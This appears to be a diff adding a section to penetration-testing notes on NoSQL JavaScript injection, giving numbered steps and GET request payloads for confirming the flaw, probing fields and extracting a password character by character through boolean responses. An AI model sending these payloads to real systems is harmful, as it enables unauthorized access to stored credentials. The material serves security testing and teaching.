@@ -134,3 +134,41 @@ Example : IF you know that username field exists ,
           it didnt.
           
 After this we maintain a list of potential fields with respect to the application being tested, and then find the existent fields.
+
+**RULES TO PROCEED WITH FOR FINDING FIELDS AND EXPLOITING JS FUNCTIONS IF VULNERABLE**
+
+1. Start with checking if app is vulnerable by simple payloads.
+
+```
+,
+/
+"
+```
+
+2. After error shows up try to escape it.
+
+```
+GET users/lookup?user=admin'+'
+```
+
+We receive error free data so we successfully confirmed  the processing of nosql syntax at the backend.
+
+3. After this check boolean statements
+
+```
+GET users/lookup?user=admin'&&'1'=='1 #for true conditions
+GET users/lookup?user=admin'&&'1'=='2 #for false conditions
+```
+
+4. now we can start by probing for existing fields.
+
+```
+GET users/lookup?user=admin'&&this.users.length>0 or this.users!=' #for existing table , also try finding length of sensitive data like password if we have to find one
+GET users/lookup?user=admin'&&this.nonexistent.length>0 or this.nonexistent !=' #for non existent and observe responses
+```
+5. Once confirmed. Have a boolean field and start extracting data character by character.
+
+```
+GET users/lookup?user=admin'&&this.password[0]=='a' || '1'=='2 #**make sure to url encode the payload**
+```
+*we often would get the output as changed length in response intercepted by burpsuite.*
